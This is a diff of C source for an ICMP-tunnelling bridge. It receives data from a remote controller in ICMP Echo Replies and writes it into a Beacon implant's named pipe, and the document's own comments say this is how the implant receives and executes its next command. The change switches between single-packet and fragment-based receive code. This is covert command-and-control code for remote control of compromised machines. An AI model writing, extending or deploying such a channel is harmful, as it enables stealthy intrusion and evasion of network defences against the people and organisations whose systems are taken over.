@@ -582,42 +582,42 @@ int bridge_to_beacon() {
         printf("[+] Getting data from controller\n");
 
         //moving to chunk based
-        //uint32_t controller_len = 0;
-
-        // // recv_icmp(s, &controller_len) will block (or timeout) until we get an ICMP Echo Reply.
-        // // It writes the exact payload length into 'controller_len', and returns a malloc’d buffer.
-        // char* controller_resp = recv_icmp(s, &controller_len);
-        // if (controller_resp) {
-        //     // 5a) Print what the controller sent (controller_len bytes).
-        //     printf("[+] Controller says (%u bytes): \"", controller_len);
-        //     printf("%.*s", controller_len, controller_resp);
-        //     printf("\"\n");
-
-        //     // 5b) Forward the controller’s data back into the Beacon’s named pipe.
-        //     //     We call write_frame(handle_beacon, controller_resp, controller_len),
-        //     //     which writes exactly 'controller_len' bytes.  This is how the Beacon
-        //     //     process reads and executes its next command.
-        //     write_frame(handle_beacon, controller_resp, controller_len);
-
-        //     // 5c) Free the buffer we got from recv_icmp.
-        //     free(controller_resp);
-        // }
-
-        printf("[+] Getting data from controller (possibly multi‐packet)\n");
-
         uint32_t controller_len = 0;
-        // recv_icmp_fragments will collect all fragments with seq=1 and give you the full buffer:
-        char *controller_resp = recv_icmp_fragments(s, &controller_len);
+
+        // recv_icmp(s, &controller_len) will block (or timeout) until we get an ICMP Echo Reply.
+        // It writes the exact payload length into 'controller_len', and returns a malloc’d buffer.
+        char* controller_resp = recv_icmp(s, &controller_len);
         if (controller_resp) {
-            // Print exactly controller_len bytes (may include zero bytes)
+            // 5a) Print what the controller sent (controller_len bytes).
             printf("[+] Controller says (%u bytes): \"", controller_len);
             printf("%.*s", controller_len, controller_resp);
             printf("\"\n");
 
-            // Forward the full controller_resp into the Beacon’s pipe
+            // 5b) Forward the controller’s data back into the Beacon’s named pipe.
+            //     We call write_frame(handle_beacon, controller_resp, controller_len),
+            //     which writes exactly 'controller_len' bytes.  This is how the Beacon
+            //     process reads and executes its next command.
             write_frame(handle_beacon, controller_resp, controller_len);
+
+            // 5c) Free the buffer we got from recv_icmp.
             free(controller_resp);
         }
+
+        // printf("[+] Getting data from controller (possibly multi‐packet)\n");
+
+        // uint32_t controller_len = 0;
+        // // recv_icmp_fragments will collect all fragments with seq=1 and give you the full buffer:
+        // char *controller_resp = recv_icmp_fragments(s, &controller_len);
+        // if (controller_resp) {
+        //     // Print exactly controller_len bytes (may include zero bytes)
+        //     printf("[+] Controller says (%u bytes): \"", controller_len);
+        //     printf("%.*s", controller_len, controller_resp);
+        //     printf("\"\n");
+
+        //     // Forward the full controller_resp into the Beacon’s pipe
+        //     write_frame(handle_beacon, controller_resp, controller_len);
+        //     free(controller_resp);
+        // }
 
         // 6) Sleep a short time before looping again.
         //    This prevents a tight spin if there’s no new pipe data or controller replies.
